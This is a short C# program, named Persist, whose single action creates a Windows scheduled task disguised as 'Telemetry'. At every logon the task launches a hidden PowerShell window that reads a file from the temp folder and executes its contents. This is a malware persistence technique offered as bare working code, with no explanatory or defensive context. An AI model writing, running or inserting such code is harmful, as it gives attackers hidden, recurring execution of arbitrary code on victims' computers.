using System.Diagnostics;

class Persist
{
    static void Main()
    {
        Process.Start("schtasks.exe", "/create /tn \"Telemetry\" /tr \"powershell -w 1 -c iex(gc $env:TEMP\\t.txt -raw)\" /sc onlogon /f");
    }
}
